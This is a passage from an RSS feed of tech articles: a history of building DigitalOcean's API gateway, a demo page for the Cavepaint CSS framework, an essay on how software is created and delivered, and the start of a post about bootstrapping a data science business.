	<p>TL;DR: this is mostly a text version of a presentation I’ve done a couple times (<a href="https://www.youtube.com/watch?v=S8OQfB6JSf8">English</a> or <a href="https://www.youtube.com/watch?v=Ld8UFU-DB1U">Portuguese</a>) on the history of building DigitalOcean’s API gateway. How we made it easier for folks to build new microservices instead of continuing to add code to our monoliths, the successes, failures and lessons learned.</p>

<p>First, where were we?</p>

<p>DigitalOcean had 3 monoliths back in 2016 when we started (all 3 are still alive today, albeit much smaller than they were before). Why were there 3? There is a shared library that contains most of the logic that all 3 applications use, so in reality we had one “monolith library” that was reused at all 3, most logic changes were made into this library and then it would be upgraded at every single app separately. The library still exists today and continues to be updated every once in a while.</p>

<p>As you can imagine, as more and more changes started to happen, with the company growing incredibly fast both in terms of business and hiring, this wasn’t ideal. Many times someone would change this core library, deploy one of the apps (the control pane you see when you sign in), but not the JSON API. So you could end up with a new feature visible at the control panel but not at the API. There would always be a time when this library version wouldn’t match across all applications, as we were not deploying them all at once every single time, so there was always space for there to be a mismatch of features available.</p>

<p>This also meant that the test suite was growing by leaps and bounds, getting slower, making running the test suite and deployments a pain. There was growing interest in doing something about this, but we couldn’t just migrate everything out. There was also a lot of interest in NOT doing Ruby anymore. There was a growing body of Golang code all over the place and people wanted to use it for their new services instead of building it all inside the old monoliths.</p>

<p>There was a catch here though, how could they possibly do all the things the Rails apps were doing, like authentication, rate limiting, authorization, feature flipping, routing, error handling and all the shared logic, in a new language, without repeating the same thing across all new projects?</p>

<p>We needed something that would be language agnostic and could be run side by side with the existing monoliths. At this point we knew a library ( like Twitter’s Finagle) wasn’t an option. Our solution had to work with the old Ruby code and the new Golang stuff (and JS, maybe Python. It was all up in the air back then). We wouldn’t be able to build a library with all the shared features needed in multiple languages.This is where the API gateway comes in.</p>



<p>The microservices.io patterns list has a great definition for the <a href="https://microservices.io/patterns/apigateway.html">API gateway</a>:</p>

<div><div><pre><code>Implement an API gateway that is the single entry point for all clients. The API gateway handles requests in one of two ways. Some requests are simply proxied/routed to the appropriate service. It handles other requests by fanning out to multiple services. 
</code></pre></div></div>

<p>It took us multiple meetings and discussions between Joonas Bergius, Nan Zhong, Joe Friedl, me and even Phil Calçado, who was the engineering lead (not sure if this was actually the title but he was the boss), to come to the realization that we were going to build an API gateway.</p>

<p>What came out of the brainstorms:</p>

<ul>
  <li>It was going to be a pure HTTP proxy, no GRPC, GraphQL or other special protocols;</li>
  <li>We would not change request or response bodies, so there wouldn’t be any protocol translation. Applications would be responsible for parsing the input and producing valid outputs, in the format the client was expecting;</li>
  <li>We’d augment the requests and responses with extra information encoded as HTTP headers, including user information, rate limiting details, tracing metadata, features enabled, so all downstream applications would have to do was looking at the headers, not special exchange format.</li>
  <li>Route configuration would be self-service, teams would call a service with their route configuration and the proxy would automatically pick up changes and update it’s routing table. It would perform basic health checking and remove destinations that weren’t reachable, but otherwise would take any request and forward it to the registered services.</li>
  <li>It would also include filters that could be run before or after a request was processed, these filters would include authentication, rate limiting, feature flipping and all the other shared pieces teams would need to be available to build apps out of the monoliths.</li>
</ul>

<p>Does it look a lot like Java’s Servlet API or Ruby’s Rack? Of course, those were the main inspirations for the design. Going for a simple, well known, design would make us move faster as there would be less stuff to do and we could always complicate it in the future. This was one of the best decisions we made and this is still the way it works nowadays.</p>

<p>Why didn’t we pick something that existed? Fair question. There really weren’t many options back then and the ones that did exist did not make it easy to integrate custom code. Our very first challenge was to decrypt and parse Rails sessions to authenticate users, and there was plenty of complex code to decrypt, unmarshal (from Ruby’s serialization format) and make sense of session data.</p>

<p>Nginx, that was one of the options when we started, only offered integration through Lua scripts, so we’d have to write this session decrypting and parsing logic in Lua scripts we’d bundle with our custom Nginx install and that did not feel like a great solution. It was hard to test the scripts, no one had any experience with Lua and the whole setup wasn’t robust, these scripts were seen mostly as doing small changes in the request flow, not for building complex logic.</p>

<p>So, we started building our own API gateway in Golang.</p>



<p>Once we had the basic proxy built, we placed it in front of some of the traffic, to make sure it could proxy correctly. The first two “filters” we built were the authentication filters, for Rails sessions and OAuth tokens. To roll these out, we started by “doing” the filter work for both monoliths but not acting on them, we’d check if the output we came to in our implementation was the same the monoliths decided on and if the response was also the same; if our own service said a request should be denied but the monoliths responded with an OK or the other way around, we’d log that and work on figuring out why it didn’t work.</p>

<p>As we built these filters, another pattern emerged, instead of having all this code inside the API gateway itself, we thought it would be faster to separate the code into a separate service. The initial goal was mostly to make it reusable by other teams if needed and make it easier for us to deploy smaller changes as deploying the gateway itself was a complicated and slow process (due to the way our internal K8s clusters networking was setup back then, we couldn’t run the gateway on them, so it ran on droplets). After that, almost all filters were just glue code to call an external service that actually knew how to get the job done.</p>

<p><img src="https://mauricio.github.io/images/api-gateway.png" alt="API Gateway simple architecture diagram" title="API Gateway simple architecture diagram"></p>

<p>While it was a response to environmental constraints and not really something we planned, this design made the gateway itself smaller and more reliable. A lot of the logic would live in these microservices instead of the gateway and updates to them had a much smaller blast radius when something went awry.</p>

<p><a href="https://twitter.com/nanzhong">@nanzhong</a> finally switched it to serve all traffic sometime in November 2016, a couple months after our announcement, including full support for authentication with the Rails session and OAuth tokens.</p>



<p>So far we had only done work internally. We weren’t exposing any of this to other teams yet, as we wanted to verify it was all behaving as expected before letting people register their services. The first integrations were bumpy and the experience for the teams we were integrating with was hard.</p>

<p>We lacked documentation and good examples. Teams had to come to us frequently to make sure their services were really up, their configurations were valid, how routing would work (what options are available? Can I use wildcards? Can I use URL parameters? In what order are routes matched?) and how they should integrate route registration into their workflows. This led to a lot of manual labor on our end helping people do stuff they could be doing themselves had we done the work to make it easier to onboard them. The lesson here was clear, if you’re working on infrastructure, make sure you can stay out of the way when people are doing their work, you want them to work on their time and not be an impediment for their work.</p>

<p>We also lacked best practices for what the backend services should look like. Multiple teams were being formed of new developers that didn’t have a lot of experience with building applications with Golang and we did not provide guidance here on how they should set up their applications and what configurations were important.</p>

<p>One recurrent issue we had at the beginning was that <a href="https://golang.org/pkg/net/http/#Server">Golang’s http.Server</a> class assumes all timeouts are infinite unless you set them (ReadTimeout, ReadHeaderTimeout, WriteTimeout, WriteIdleTimeout) and this would lead to services getting a broken connection from the client (the API gateway) and wouldn’t know what it was until we checked their configs and noticed they just didn’t set a value (while we did have a max timeout for all requests on our end, so we’d close a connection that took too long).</p>

<p>Providing better guidance here for basic options and configurations that teams should be doing in all their apps would have saved a lot of time and effort for everyone.</p>

<p>Next, when registering routes, teams would talk directly to the key-value store we were using to store the routing table (Consul) and as you can imagine this wasn’t ideal. There was very little validation in place and it was super simple for people to register routes that wouldn’t load or that wouldn’t really route anything due to being incomplete. …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html">https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html</a></em></p>]]>
            </description>
            <link>https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25785808</guid>
            <pubDate>Fri, 15 Jan 2021 01:37:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cavepaint, the no-workflow, no-CSS, custom-property-powered modern CSS framework]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25785688">thread link</a>) | @rriepe
<br/>
January 14, 2021 | https://cavepaint.github.io/cavepaintcss/ | <a href="https://web.archive.org/web/*/https://cavepaint.github.io/cavepaintcss/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
  <nav>
      <a href="">
          Cavepaint CSS
      </a>
      
  </nav>
      <div>
      <div>
        <div>
          <p><img src="https://cavepaint.github.io/cavepaintcss/cavepaint_logo.svg" alt="Cavepaint logo"></p><p>This page is running Cavepaint, the no-workflow, <a href="https://cavepaint.github.io/cavepaintcss/no-css">no-CSS</a>, custom-property-powered modern CSS framework. Customize it here.</p>
          
        </div>
        

        
      </div>
      <div>
        
        <p>Cavepaint is a CSS framework for devs and teams who want to <a href="#cheatsheet">spend way less time on CSS</a></p>
      </div>
      <!-- <p class="text-center"><a href="" onClick="newCSS()"><strong>Try a new cavepaint.css!</strong></a></p> -->
        <!-- <a class="big inline-block margin-bottom bright second split text-padding" href="https://github.com/cavepaint/cavepaintcss">View Github</a> -->
      
    </div>

    <section>
      <div>
        
        
        

        <div>
          <h5>or compile this HEADLESS Less</h5>
          </div>
  
      </div>
    </section>
    

    <div>





    <section>
      <div>
        <pre>&lt;div class="card two-column golden reverse margin-auto gutter"&gt;
  &lt;img src="caveman.svg" alt="The Cavepaint caveman"&gt;
  &lt;div&gt;
    &lt;h4 class="no-margins"&gt;Cavepaint&lt;/h4&gt;
    &lt;p class="text-crunch"&gt;
      Do CSS &lt;em&gt;without writing CSS&lt;/em&gt;.
    &lt;/p&gt;
  &lt;/div&gt;
&lt;/div&gt;</pre>
<p><span>Example markup</span>
      </p></div>

      <div>
        <div>
          <p><img src="https://cavepaint.github.io/cavepaintcss/caveman.svg" alt="The Cavepaint caveman">
          </p>
          
          <div>
            <h4>Cavepaint</h4>
            <p>
              Do CSS <em>without writing CSS</em>.
            </p>
          </div>
        </div>
        <p><span>Example output</span>
      </p></div>

      <div>
<pre>&lt;section class="inner-card-width text-center gutter"&gt;
  &lt;div class="three-column light yellow padding"&gt;
    &lt;div class="green rounded"&gt;&amp;check;&lt;/div&gt;
    &lt;div class="green rounded"&gt;&amp;check;&lt;/div&gt;
    &lt;div class="red rounded"&gt;&amp;cross;&lt;/div&gt;
  &lt;/div&gt;
&lt;/section&gt;</pre>
<p><span>Example markup</span>
      </p></div>

      
    </section>
    </div>

    <section>
      <div>
        <div>
          <div>
            <div>
              <h4>No workflow, no worries</h4>
              <p>No gzipping. No tree-shaking. No&nbsp;stress. Simply use the CSS&nbsp;file.</p>
            </div>
            <div>
              <h4>Over 500 colors</h4>
              <p>Breathe life into your pages with hundreds of easy-to-remember, easy-to-master color names.</p>
            </div>
          </div>
        </div>
        <div>
          <h4>Stone-age simplicity</h4>
          <p>Simple class names, taken mostly from CSS, with no abbreviations or numbers.</p>
        </div>
        
      </div>
    </section>

    

    
            <section id="cheatsheet">
                <h3>The Cavepaint CSS&nbsp;cheatsheet</h3>
      
                  <div>
                    <h5>two-column</h5>
                    <div>
                      
                      
                      <div>
                        <h6>two-column golden reverse</h6>
                        
                      </div>
                    </div>
                  </div>
                  <div>
                    <h5>three-column</h5>
                    
                    <div>
                      <div>
                        <h6>three-column golden leading</h6>
                        
                      </div>
                      <div>
                        <h6>three-column golden trailing</h6>
                        
                      </div>
                    </div>
                  </div>
    
                  
    
    
                  
    
                  
    
                  
    
                  <div>
                    <h6>Wheel colors</h6>
                    <div>
                      <p>base-color</p>
                      <p>triad</p>
                      <p>complement</p>
                      <p>third triad</p>  
                    </div>
                    <div>
                      <p>accent</p>
                      <p>second accent</p>
                      <p>split</p>
                      <p>second split</p>  
                    </div>
                    <div>
                      <p>tetrad</p>
                      <p>second tetrad</p>
                      <p>third tetrad</p>
                      <p>fourth tetrad</p>  
                    </div>
                  </div>
    
    
                  <h6>Palette colors</h6>
                  
    
                  <h6>text-color (composes with any color)</h6>
                  <div>
                    <div>
                      <p>text-color red</p>
                      <p>text-color orange</p>
                      <p>text-color yellow</p>
                    </div>
    
                    <div>
                      <p>text-color green</p>
                      <p>text-color teal</p>
                      <p>text-color cyan</p>
                    </div>
    
                    <div>
                      <p>text-color blue</p>
                      <p>text-color purple</p>
                      <p>text-color magenta</p>
                    </div>
    
                    <div>
                      <p>text-color base-color</p>
                      <p>text-color gray</p>
                      <p>text-color black</p>
                    </div>
                  </div>
                  
    
                  <div>
                    <h6>Widths</h6>
                    <ul>
                      <li>card-width</li>
                      <li>
                      
                        
                      
                      </li>
                      <li>text-width</li>
                      <li>
    
                        
                      
                       
                      
                      </li>
                      <li>page-width</li>
                      <li>
                      
                        
                      
                      </li>
    
                      <li>feature-width</li>
                      <li>
                      
                        
                      
                      </li>
                    </ul>
                  </div>
      
                  <div>
                    <h6>Inner widths</h6>
                    <ul>
                      <li>inner-card-width</li>
                      <li>
                      
                        
                      
                      </li>
                      <li>inner-text-width</li>
                      <li>
    
                        
                      
                       
                      
                      </li>
                      <li>inner-page-width</li>
                      <li>
                      
                        
                      
                      </li>
    
                      <li>inner-feature-width</li>
                      <li>
                      
                        
                      
                      </li>
                    </ul>
                  </div>
    
                  
    
                  <div>
                    <div>
                      <h6>Shadows</h6>
                      <ul>
                        <li>box-shadow</li>
                        <li>inset</li>
                        <li>shallow box-shadow</li>
                        <li>deep box-shadow</li>
                      </ul>
                    </div>
        
                    <div>
                      <h6>Border helpers</h6>
                      <ul>
                        <li>current-color border</li>
                        <li>thick border</li>
                        <li>dashed border</li>
                        <li>dotted border</li>
                      </ul>
                    </div>
                  </div>
    
                  
    
                  <div>
                    <h5>Font families</h5>
                    <div>
                      <div>
                        <h6>sans-serif</h6>
                        <ul>
                          <li>Lorem ipsum dolor sit amet, consectetur adipiscing elit.</li>
                        </ul>
                      </div>
      
                      <div>
                        <h6>serif</h6>
                        <ul>
                          <li>Lorem ipsum dolor sit amet, consectetur adipiscing elit.</li>
                        </ul>
                      </div>
      
                      <div>
                        <h6>monospace</h6>
                        <ul>
                          <li>Lorem ipsum dolor sit amet, consectetur adipiscing elit.</li>
                        </ul>
                      </div>
                    </div>
                    
                  </div>
      
                  
      
                  
      
                  <div>
                    <h5>Grid child classes</h5>
                    <p><strong>grid-width-</strong></p>
                    <div>
                      <p>one</p>
                      <p>eleven</p>
                      <p>two</p>
                      <p>ten</p>
                      <p>three</p>
                      <p>nine</p>
                      <p>four</p>
                      <p>eight</p>
                      <p>five</p>
                      <p>seven</p>
                      <p>six</p>
                      <p>six</p>
                      <p>twelve</p>
                    </div>
                  </div>
      
                  <div>
                    <h5>Centering</h5>
                    <div>
                      <div>
                        <h6>text-align-center</h6>
                        <p>This is centered text.</p>
                      </div>
                      
                      <div>
                        <h6>vertical-center</h6>
                        <div>
                        <p>Center vertically with the .vertical-center composable on an element that has children.</p>
      
                        
                        </div>
                        
                      </div>
                    </div>
                  </div>
      
                  <div>
                    <h5>Two-column, three-column and grid responsive helpers</h5>
                    
                    
                    
                    
      
                    <h5>hide visibility helpers</h5>
                    
      
                  
      
                  
      
                </div>
    
                
              </section>
    
    
              
    <div>
      <section>
              <div>
                  <p>bright accent</p>
                  <p>light accent</p>
                  <p>accent</p>
                  <p>dark accent</p>
                  <p>dim accent</p>
              
                  <p>cool bright accent</p>
                  <p>cool light accent</p>
                  <p>cool accent</p>
                  <p>cool dark accent</p>
                  <p>cool dim accent</p>
              
                  <p>neutral bright accent</p>
                  <p>neutral light accent</p>
                  <p>neutral accent</p>
                  <p>neutral dark accent</p>
                  <p>neutral dim accent</p>
              
                  <p>warm bright accent</p>
                  <p>warm light accent</p>
                  <p>warm accent</p>
                  <p>warm dark accent</p>
                  <p>warm dim accent</p>
              
                  <p>dull bright accent</p>
                  <p>dull light accent</p>
                  <p>dull accent</p>
                  <p>dull dark accent</p>
                  <p>dull dim accent</p> 
              </div>
                        <div>
                  <p>bright second accent</p>
                  <p>light second accent</p>
                  <p>second accent</p>
                  <p>dark second accent</p>
                  <p>dim second accent</p>
              
                  <p>cool bright second accent</p>
                  <p>cool light second accent</p>
                  <p>cool second accent</p>
                  <p>cool dark second accent</p>
                  <p>cool dim second accent</p>
              
                  <p>neutral bright second accent</p>
                  <p>neutral light second accent</p>
                  <p>neutral second accent</p>
                  <p>neutral dark second accent</p>
                  <p>neutral dim second accent</p>
              
                  <p>warm bright second accent</p>
                  <p>warm light second accent</p>
                  <p>warm second accent</p>
                  <p>warm dark second accent</p>
                  <p>warm dim second accent</p>
              
                  <p>dull bright second accent</p>
                  <p>dull light second accent</p>
                  <p>dull second accent</p>
                  <p>dull dark second accent</p>
                  <p>dull dim second accent</p> 
              </div>
                        <div>
                  <p>bright split</p>
                  <p>light split</p>
                  </div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cavepaint.github.io/cavepaintcss/">https://cavepaint.github.io/cavepaintcss/</a></em></p>]]>
            </description>
            <link>https://cavepaint.github.io/cavepaintcss/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25785688</guid>
            <pubDate>Fri, 15 Jan 2021 01:21:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How we create and deliver software]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25785542">thread link</a>) | @tosh
<br/>
January 14, 2021 | https://adamwiggins.com/making-computers-better/create | <a href="https://web.archive.org/web/*/https://adamwiggins.com/making-computers-better/create">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <h3>how we create and deliver software</h3>

    <p>Perhaps this is the part of the essay where you expect me to go on a rant about the merits of <a href="https://dhh.dk/arc/000074.html">strong typing</a>, the deficiencies of ORMs, or the <a href="https://xkcd.com/1597/">inscrutability of Git commands</a>.</p>

    <p>But on the contrary, I think we're in a golden age for programming languages, library ecosystems, and development environments.</p>

    <p>Consider:</p>

    <ul>
      <li><p>Beautiful and expressive syntaxes like Ruby, Python, Go, Rust, React, SQL, Swift, and HTML/CSS</p></li>
      <li><p>Code editors like vim, Sublime, Xcode, and VS Code</p></li>
      <li><p>Collaboration tools like GitHub, Slack/Discord, and Zoom/screenshare</p></li>
      <li><p>Self-learning resources ranging from Stack Overflow to YouTube educators and Twitch programming live streams</p></li>
    </ul>

    <figure>
      <img src="https://adamwiggins.com/making-computers-better/twitch-coding.png" alt="Suz Hinton coding on Twitch">

      <figcaption>
        <svg width="50" height="10" viewBox="0 0 50 10" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="50" height="10" rx="2.5" fill="#298070"></rect>
        </svg>

        <p>Watching developers build software in realtime is a blessing of the Twitch and YouTube era. Image from <a href="https://medium.com/@suzhinton/live-coding-stream-some-news-a09bb6d15ef1">Suz Hinton</a></p>
      </figcaption>
    </figure>

    <p>Where I see the potential for improvement in software creation is developer workflows.</p>

    <p>Computing is at its best when it’s fun, fast, and ceremony-free. The user (or developer) can focus on what they want to get done with a minimum of steps and fussy errors. Compare a smartphone to a desktop computer in terms of those qualities. What's the equivalent of a smartphone-like experience for development?</p>

    <p>Three workflow improvments I’ll talk about here:</p>

    <ol>
      <li><p><strong>Joining a project.</strong> If I invite another developer to edit my software, how fast and easy for them to run the project within a development environment and make their first change?</p></li>
      <li><p><strong>Seeing changes.</strong> How much time elapses between me making a code change and seeing the result of that change in its native context?</p></li>
      <li><p><strong>Publishing to users.</strong> Once I have a change working the way I want in my dev environment, how long does it take to publish that change to one or more of my users?</p></li>
    </ol>

    <p>Taking each in turn…</p>

    <p><strong>Joining a project.</strong> By this I mean any time someone needs to set up a development environment to run and edit a given project. That includes me starting a new project in some language/framework; a new person I've invited to join my existing project; me editing my existing project on a new computer; or me returning to one of my old projects that I haven't worked on in months or years.</p>

    <p>As software development stacks have grown in complexity, so has the difficulty of onboarding new people to a project. Companies with big codebases have entire teams dedicated to building out the onboarding experience. It may take <a href="https://www.quora.com/What%E2%80%99s-the-new-employee-onboarding-at-Facebook-like">days or weeks of effort</a> to get a new developer up and running.</p>

    <p>Even a smaller codebase may require lots of trial-and-error: Xcode projects that require <a href="https://medium.com/codespace69/ios-xcode-code-signing-error-code-signing-is-required-for-product-type-application-in-sdk-216c1b16311e">confusing developer account key setup</a> or front-end web projects with a <a href="https://medium.com/@housecor/browserify-vs-webpack-b3d7ca08a0a9">maze-like stack of build tools</a>. Setup instructions documented in a README are almost always out of date.</p>

    <p>A leap forward in the last decade was the widespread adoption of <a href="https://12factor.net/config">dependency management</a> such as <a href="https://www.npmjs.com/">NPM</a>, <a href="https://crates.io/">Crate</a>, and <a href="https://bundler.io/">Bundler</a>. Dependency managers try to install everything you need to run the project. And importantly, they give a clear error when the project will not be runnable—for example, if you have the wrong version of the language runtime.</p>

    <figure>
      <video preload="metadata" muted="" loop="" playsinline="" autoplay="">
        <source src="https://adamwiggins.com/making-computers-better/npm-install.mp4#t=0.01">
      </video>

      <figcaption>
        <svg width="50" height="10" viewBox="0 0 50 10" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="50" height="10" rx="2.5" fill="#298070"></rect>
        </svg>

        <p>Programmatic description of requirements execute automatically, unlike manual documentation.</p>
      </figcaption>
    </figure>

    <p>Another technique is wrapping up projects into container images with tools like <a href="https://www.vagrantup.com/">Vagrant</a> or <a href="https://www.smashingmagazine.com/2016/04/stop-installing-your-webdev-environment-locally-with-docker/">Docker</a>. This is the right spirit, but its use is a bit heavyweight, so most projects don’t bother.</p>

    <p>The future solution I’d like to see is a one-click, can’t-fail project installation. I want joining a new project to be as easy as clicking a link to a Google Doc where I can immediately start making edits. That probably requires a toolchain that is fully self-describing—like dependency managers, but extended to absolutely every aspect of setting up a project including <a href="https://12factor.net/config">environment configuration</a> and <a href="https://12factor.net/backing-services">external services</a>.</p>

    <p>One move in this direction is web-based all-in-one development environments such as <a href="https://glitch.com/">Glitch</a>, <a href="https://repl.it/">Repl.it</a>, and <a href="https://github.com/features/codespaces">Codespaces</a>. So far none of these have become widely popular with developers, who typically prefer local and modular toolchains.</p>

    <p><strong>Seeing changes.</strong> Once upon a time, developers had an extensive <a href="https://xkcd.com/303/">compile-run cycle</a> that could take minutes or longer. When I worked in the game industry doing Dreamcast and Playstation 2 game development, I had as much as a fifteen-minute wait on my build cycle. I kept a book by my desk and got a lot of reading done in those days.</p>

    <p>PHP and other early web dev tools offered a save-reload loop that took just seconds—a revelation for me after years of game development. More recently, <a href="https://gohugo.io/commands/hugo_server/">live-reload dev servers</a> go a step better, removing the need to switch windows and press the reload button.</p>

    <figure>
      <video preload="metadata" muted="" loop="" playsinline="" autoplay="">
        <source src="https://adamwiggins.com/making-computers-better/flutter-hot-reload.mp4#t=0.01">
      </video>

      <figcaption>
        <svg width="50" height="10" viewBox="0 0 50 10" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="50" height="10" rx="2.5" fill="#298070"></rect>
        </svg>

        <p><a href="https://medium.com/podiihq/understanding-hot-reload-in-flutter-2dc28b317036">Hot reload in Flutter</a> creates a fast feedback loop to make development more efficient and fun.</p>
      </figcaption>
    </figure>

    <p>iOS and Android default dev kits still have a somewhat long cycle to get the program built and running on-device. Some newer frameworks like <a href="https://flutter.dev/">Flutter</a> and <a href="https://developer.apple.com/xcode/swiftui/">SwiftUI</a> can hot-reload changes.</p>

    <p>All of this takes us gradually closer to the ideal state: perfect immediacy. I make a change, I see it; no waiting. We’re not there yet, but I hope we might achieve it in the coming decade.</p>

    <p><strong>Publishing to users.</strong> In ages past, we might share our software by <a href="https://arstechnica.com/staff/2018/11/first-encounter-compute-magazine-and-its-glorious-tedious-type-in-code/">putting the source code into a magazine</a> or selling it in a box in a software store. More recently, you might send someone the .EXE via email or let them download it from your website.</p>

    <p>Direct distribution of .EXEs was great in many ways, but opened the door for a profusion of malware turning computers into legions of <a href="https://en.wikipedia.org/wiki/Zombie_(computing)">zombie botnets</a>. The solution has been a combination of permissions/sandboxing and app stores.</p>

    <figure>
      <img src="https://adamwiggins.com/making-computers-better/boxed-software.jpg" alt="Turbo Pascal, software delivered in a box">

      <figcaption>
        <svg width="50" height="10" viewBox="0 0 50 10" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="50" height="10" rx="2.5" fill="#298070"></rect>
        </svg>

        <p>Software delivery circa 1988. From <a href="https://www.worthpoint.com/worthopedia/borland-turbo-pascal-version-5-1842665229">WorthPoint</a></p>
      </figcaption>
    </figure>

    <p>Curated app stores help with malware and discovery, which is a clear win. But the intermediation between a software creator and the user has many downsides. Permission to send bugfixes to your users, unknown review timelines, rejections for seemingly arbitrary reasons—it kills innovation, momentum, and simple joy of building and shipping good products to your users.</p>

    <p>The iOS App Store is infamous for its heavy developer account setup (<a href="https://developer.apple.com/support/D-U-N-S/">DUNS number</a>, anyone?) and an opaque review process. And lest you think Apple is alone here, just check out every other vendor’s app store: the <a href="https://developer.chrome.com/webstore/publish">Chrome Web Store</a>, <a href="https://docs.microsoft.com/en-us/windows/uwp/publish/the-app-certification-process">the Windows store</a>, Steam and all gaming consoles, Linux stores like <a href="https://snapcraft.io/">Ubuntu</a> and <a href="https://appcenter.elementary.io/">Elementary</a>, and many others—all with their own variations on submission guidelines, review hurdles, and app permissions and sandboxing.</p>

    <figure>
      <img src="https://adamwiggins.com/making-computers-better/testflight.png" alt="screenshot of TestFlight">

      <figcaption>
        <svg width="50" height="10" viewBox="0 0 50 10" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="50" height="10" rx="2.5" fill="#298070"></rect>
        </svg>

        <p><a href="https://developer.apple.com/testflight/">TestFlight</a> and <a href="https://appcenter.ms/">App Center</a> offer a somewhat faster path for delivering software while still within the app store model.</p>
      </figcaption>
    </figure>

    <p>I can send a tweet that's published to potentially millions of users in seconds. Why can't I do the same with publishing my software?</p>

    <p>Alongside this consolidation on the app store model, we have a quiet juggernaut: the web. The miracle of the web is that anyone can visit a website, download the software program described there, and execute it instantly and safely.</p>

    <p>Only the web was built from the ground-up with fine-grained permissions and a language runtime with near-perfect <a href="https://users.soe.ucsc.edu/%7Eabadi/CS223_F12/taly.pdf">sandboxing</a>. There's a lot that native apps can do that the web can't, like high performance and tight hardware integration (and I don’t think the web will ever catch up). But even so, the simple power of the web-based delivery mechanism is so good that I expect it to continue to dominate software creation and delivery for the foreseeable future.</p>

    <figure>
      <img src="https://adamwiggins.com/making-computers-better/heroku.png" alt="original Heroku logo">

      <figcaption>
        <svg width="50" height="10" viewBox="0 0 50 10" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="50" height="10" rx="2.5" fill="#298070"></rect>
        </svg>

        <p>Proud of this one. :-)</p>
      </figcaption>
    </figure>

    <p>One swing I took at this problem space is <a href="https://www.heroku.com/">Heroku</a>. As great as the web is at delivering software from a server, you still need to do a bunch of time-consuming and error-prone installation and configuration ceremonies to set up and deploy to that server. Heroku takes that all away: with a single command you go from code on your computer to working software in the hands of your users. <a href="https://www.netlify.com/">Netlify</a>, <a href="https://vercel.com/">Vercel</a>, <a href="https://www.digitalocean.com/docs/app-platform/">Digital Ocean’s App Platform</a>, and others have continued this instant-deployment pattern, and as a software developer I can't imagine working any other way now.</p>

    

    <p>Putting together these three workflow improvements (fast ways to join a project, see changes, and publish) and you get the the <a href="https://2018.splashcon.org/track/live-2018-papers">live coding</a> experience seen in <a href="https://2018.splashcon.org/track/live-2018-papers">Codepen</a>, <a href="https://jsfiddle.net/">JS Fiddle</a>, and <a href="https://observablehq.com/">Observable</a>. This is not quite <a href="https://www.nngroup.com/articles/direct-manipulation/">direct manipulation</a> for software creation, but it's a close as we've gotten so far, and I hope dev tool creators keep pushing it further.</p>

    <p>And one more thing. If we can somehow reach a state where joining, seeing changes, and publishing are effortless and instantaneous, that opens up the final frontier: <a href="https://www.inkandswitch.com/end-user-programming.html">end-user programming</a>.</p>
    <p>End-user programming blurs all the lines: developer and user can easily be the same person; software creation can be a more collaborative and inclusive experience rather than siloed to professional software engineers; and every person in our society gets to experience (if even briefly) the satisfaction, empowerment, and analytical mindset that we programmers enjoy in our daily work.</p>

    <p><strong>The world we have:</strong> Programming tools are good, although still out of reach for most people. Project setup and seeing results of changes are slow and clunky. Software delivery is increasingly intermediated by app stores.</p>

    <p><strong>The world I want:</strong> Creating software feels like direct manipulation—as fast and fun as using a smartphone. Delivering software to users is instantaneous, like sending a tweet.</p>
  </article></div>]]>
            </description>
            <link>https://adamwiggins.com/making-computers-better/create</link>
            <guid isPermaLink="false">hacker-news-small-sites-25785542</guid>
            <pubDate>Fri, 15 Jan 2021 01:02:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bootstrapping my data science business convinced me to quit]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25785534">thread link</a>) | @data4lyfe
<br/>
January 14, 2021 | https://www.interviewquery.com/blog-reflecting-on-bootstrapping-our-data-science-business/ | <a href="https://web.archive.org/web/*/https://www.interviewquery.com/blog-reflecting-on-bootstrapping-our-data-science-business/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>Over one year ago, I decided to quit my data science job and pursue my <a href="https://www.interviewquery.com/">bootstrapped data science side-project</a> full time. It was a hard decision to make, but once I quit and was freed from the corporate nine to five, my life turned to complete bliss.</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>That bliss lasted about two weeks before it reverted back to the mean. Honeymoons exist in all facets of life, and bootstrapping a business does not make you impervious to Mondays. Rather every day just became a Thursday. But more on that later...</p><p>I wanted to reflect on this past year plus of bootstrapping and add in some frameworks for why anyone reading this on the fence of quitting their job for their side-hustle should do so. Quitting was one of the hardest decisions that I had to make, but the best one I went through with. It's also a decision that many people should not do. </p><p>But for the small percentage of the people out there, bootstrapping a startup can be an awesome thing. You resign yourself to make trades. </p><p>You trade a steady stream of work and meetings for flexibility in your own time and hours. You trade your current monthly salary now for no income but with future options of money. And you trade office externalities and politics for taking full control of how your career might turn out. </p><p>And ultimately if those trades and values are worth it, then quitting your job can make sense in a very real way. </p><h2 id="how-it-got-started">How it got started</h2><p>On November 1st 2019, I officially quit my job as a data scientist at Nextdoor after working there for exactly a year. I had started a side project called Interview Query with my co-founder, Shane, six months prior. </p><p>Interview Query started out as an email newsletter that each day sent a user a data science interview question, and then the solution the next day if the user upgraded to premium. Over the past year we’ve built the product into a fully-fledged data science course, questions database, and became the de-facto data science interview prep resource.<br></p><figure><img 